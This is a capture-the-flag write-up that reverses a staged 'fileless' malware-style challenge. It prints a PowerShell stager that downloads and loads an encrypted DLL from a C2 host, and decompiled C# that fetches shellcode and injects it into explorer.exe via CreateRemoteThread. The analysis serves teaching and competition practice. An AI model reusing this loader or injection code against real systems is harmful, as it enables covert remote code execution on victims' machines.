# Fileless

We get a `.lnk` file that executes a powershell script, which we can find by using RMB -> properties on Windows.

The script resembles a malware, and consists of multiple stages, that download next stage's code and executes it.

First stage is in powershell, and it checks the contents of `C:\Users\Public\Documents\token.txt` file.

stage1.ps1
```ps1
$C2='fileless.ecsc23.hack.cert.pl:5060'


Write-Output (Get-Content "C:\\Users\\Public\\Documents\\token.txt")


$E = [System.Text.Encoding]::ASCII;
$K = $E.GetBytes('zHsqz5LbhQuqcWQmJvRW');
$R = {
    $D, $K = $Args;
    $i=0;
    $S=0..255;
    0..255 | ForEach-Object {
        $J=($J+$S[$_]+$K[$_%$K.Length])%256;
        $S[$_],$S[$J]=$S[$J],$S[$_]
    };
    $D | ForEach-Object {
        $I=($I+1)%256;
        $H=($H+$S[$I])%256;
        $S[$I],$S[$H]=$S[$H],$S[$I];
        $_-bxor$S[($S[$I]+$S[$H])%256]
    }
}

if ((compare-object (& $R $E.GetBytes((Get-Content "C:\\Users\\Public\\Documents\\token.txt")) $K) ([System.Convert]::FromBase64String("FxxGrgbb/w==")))) {
    Exit
}


$bytes = [byte[]](& $R (Invoke-WebRequest "http://$C2/O4vg7tmRa8fOCYGQH9U5" -UseBasicParsing).Content $K)

$assembly = [System.Reflection.Assembly]::Load($bytes)
Set-Content stage4.dll -Value $bytes -AsByteStream


$assembly.GetType('E.C').GetMethod('SC', [Reflection.BindingFlags] 'Static, Public, NonPublic').Invoke($null, [object[]]@($C2))
```

We can find required contents of token.txt by reversing the $R function

```ps1
$data = [System.Convert]::FromBase64String("FxxGrgbb/w==")
$token = (& $R $data $K)
Set-Content "C:\\Users\\Public\\Documents\\token.txt" -Value ([byte[]]$token) -AsByteStream
```
token.txt - `Boz3nka`

Next, stage1 downloads a DLL library, and executes a function inside.

We can view it's source code using dotPeek:

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace E
{
  public class C
  {
    public static readonly string ECSC = "NJ6WGgy3yHdkx0c`ojGW";
    public static readonly string PATH = "emf9v[JGi@m6rEBJOCB[";

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(
      uint processAccess,
      bool bInheritHandle,
      int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      int nSize,
      out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(
      IntPtr hProcess,
      IntPtr lpThreadAttributes,
      uint dwStackSize,
      IntPtr lpStartAddress,
      IntPtr lpParameter,
      uint dwCreationFlags,
      IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

    private static void Fun(byte[] buf)
    {
      IntPtr hProcess = C.OpenProcess(2035711U, false, Process.GetProcessesByName("explorer")[0].Id);
      IntPtr num = C.VirtualAllocEx(hProcess, IntPtr.Zero, 4096U, 12288U, 64U);
      C.WriteProcessMemory(hProcess, num, buf, buf.Length, out IntPtr _);
      C.CreateRemoteThread(hProcess, IntPtr.Zero, 0U, num, IntPtr.Zero, 0U, IntPtr.Zero);
    }

    public static byte[] Ks(int n, string password)
    {
      byte[] numArray = new byte[n];
      uint num = 1337;
      for (int index1 = 0; index1 < n; ++index1)
      {
        for (int index2 = 0; index2 < password.Length; ++index2)
          num += (uint) (index1 * (int) password[index2] ^ index2 * (int) password[index1 % password.Length]);
        numArray[index1] = (byte) (num & (uint) byte.MaxValue);
      }
      return numArray;
    }

    public static byte[] Bop(byte[] data)
    {
      byte[] numArray1 = new byte[data.Length];
      byte[] numArray2 = C.Ks(data.Length, C.ECSC);
      for (int index = 0; index < data.Length; ++index)
        numArray1[index] = (byte) ((uint) numArray2[index] ^ (uint) data[index]);
      return numArray1;
    }

    public static string Str(byte[] data) => Encoding.ASCII.GetString(C.Bop(data));

    private static unsafe void TrustMeImAnEngineer(string data)
    {
      string str = data;
      char* chPtr = (char*) str;
      if ((IntPtr) chPtr != IntPtr.Zero)
        chPtr += RuntimeHelpers.OffsetToStringData;
      for (int index = 0; index < data.Length; ++index)
        chPtr[index] = (char) ((uint) chPtr[index] ^ 1U);
      str = (string) null;
    }

    static C()
    {
      C.TrustMeImAnEngineer(C.ECSC);
      C.TrustMeImAnEngineer(C.PATH);
    }

    public static void SC(string c2)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(File.ReadAllText("C:\\Users\\Public\\Documents\\credentials.txt"));
      byte[] numArray = Convert.FromBase64String("uOWIiZv8ed7f");
      if (!((IEnumerable<byte>) C.Bop(bytes)).SequenceEqual<byte>((IEnumerable<byte>) numArray))
        Process.GetCurrentProcess().Kill();
      C.Str(Convert.FromBase64String("s/6mq5GxZ8HKJ91JN/3P7dd5auOx62xRLiBZPbCIut7hEwF3oB2+11x8"));
      C.Fun(new HttpClient().GetAsync("http://" + c2 + "/" + C.PATH).Result.Content.ReadAsByteArrayAsync().Result);
    }

    public static void Main(string[] argv) => Console.WriteLine("What flag are you talking about? I'm just an innocent program!");
  }
}
```


As we can see, it checks for `credentials.txt` file, and then downloads a shellcode, which is then executed by `Fun()` in `explorer.exe` process.

We can get required `credentials.txt` content by invoking the Bop() function, because Bop(Bop(data)) == data:
```cs
File.WriteAllText(@"C:\Users\Public\Documents\credentials.txt", Encoding.ASCII.GetString(C.Bop(Convert.FromBase64String("uOWIiZv8ed7f"))));
```
credentials.txt - ``coZR0b1sz``

Next, we download `shell.bin` from the URL in stage2.

We can reverse engineer it using binary ninja (cleaned up version):

```c
int64_t sub_0()
{
    int64_t rdi;
    int64_t var_10 = rdi;
    int64_t TokenPath;
    __builtin_strcpy(TokenPath, "C:\\Users\\Public\\Documents\\token.txt");
    int64_t CredentialsPath;
    __builtin_strcpy(CredentialsPath, "C:\\Users\\Public\\Documents\\credentials.txt");
    int64_t WalletPath;
    __builtin_strcpy(WalletPath, "C:\\Users\\Public\\Documents\\wallet.txt");
    int64_t var_e6 = 0x72006500730075;
    var_e6 = 0x3200330072;
    int64_t var_f8 = 0x6e00720065006b;
    int64_t var_f0 = 0x320033006c0065;
    int16_t var_e8 = 0;
    int64_t CreateFileA;
    __builtin_strcpy(CreateFileA, "CreateFileA");
    int64_t LoadLibraryW;
    __builtin_strcpy(LoadLibraryW, "LoadLibraryW");
    int64_t ReadFile;
    __builtin_strncpy(ReadFile, "ReadFile", 9);
    int64_t ExitProcess;
    __builtin_strcpy(ExitProcess, "ExitProcess");
    int64_t MessageBoxA;
    __builtin_strcpy(MessageBoxA, "MessageBoxA");
    int64_t Congratulations;
    __builtin_strcpy(Congratulations, "Congratulations");
    void* kernel = getKernel(&var_f8);
    void* exitProcess = getFun(kernel, &ExitProcess);
    void* loadLibrary;
    int64_t rsi;
    loadLibrary = getFun(kernel, &LoadLibraryW)();
    void* messageBox = getFun(loadLibrary, &MessageBoxA);
    int64_t walletContent = 0;
    int64_t var_530 = 0;
    void var_528;
    __builtin_memset(&var_528, 0, 0x3d8);
    int64_t rdi_1;
    int64_t rsi_1 = readFileFun(rdi_1, rsi, &walletContent, &WalletPath);
    if (checkWalletContent(&walletContent) == 0)
    {
        rsi_1 = exitProcess();
    }
    int64_t flagPrefix;
    __builtin_strncpy(flagPrefix, "ecsc23{", 0x10);
    void var_918;
    __builtin_memset(&var_918, 0, 0x3d8);
    int64_t* var_20 = &flagPrefix;
    do
    {
        var_20 = (var_20 + 1);
    } while (*var_20 != 0);
    int64_t rsi_2;
    int64_t rdi_2;
    int64_t rdi_3;
    rsi_2 = readFileFun(rdi_2, rsi_1, var_20, &TokenPath);
    do
    {
        var_20 = (var_20 + 1);
    } while (*var_20 != 0);
    void* var_20_1 = (var_20 + 1);
    *var_20 = 0x2d;
    int64_t rsi_3;
    int64_t rdi_4;
    rsi_3 = readFileFun(rdi_3, rsi_2, var_20_1, &CredentialsPath);
    do
    {
        var_20_1 = (var_20_1 + 1);
    } while (*var_20_1 != 0);
    void* var_20_2 = (var_20_1 + 1);
    *var_20_1 = 0x2d;
    readFileFun(rdi_4, rsi_3, var_20_2, &WalletPath);
    do
    {
        var_20_2 = (var_20_2 + 1);
    } while (*var_20_2 != 0);
    void* var_20_3 = (var_20_2 + 1);
    *var_20_2 = 0x7d;
    return messageBox();
}

void* __convention("win64") getFun(void* arg1, char* arg2){...}
int64_t __convention("win64") getKernel(int16_t* arg1){...}

int64_t readFileFun(int64_t fileName, int64_t fileAccess, int64_t arg3, int64_t arg4) {...}

uint64_t __convention("win64") checkWalletContent(void* wallet)
{
    int64_t encoded;
    __builtin_strncpy(encoded, "xk7k~>u7KZ^", 0xf);
    uint64_t result;
    while (true)
    {
        int i;
        if (i > 0xa)
        {
            result = *(wallet + 0xb) == 0;
            break;
        }
        if ((*(wallet + i) + 0xa) != *(&encoded + i))
        {
            result = 0;
            break;
        }
        i = (i + 1);
    }
    return result;
}

```

This one checks contents of `wallet.txt` and then prints the flag, which basically consists of `ecsc23{<credentials.txt>-<token.txt>-<wallet.txt>}`

checkWalletContent is just adding 10 to each byte in wallet.txt content and compares it with `xk7k~>u7KZ^`

So, we can reverse it:
```py
''.join([chr(x-10) for x in b"xk7k~>u7KZ^"])
```

wallet.txt - `na-at4k-APT`

And finally we have the flag! `ecsc23{Boz3nka-coZR0b1sz-na-at4k-APT}`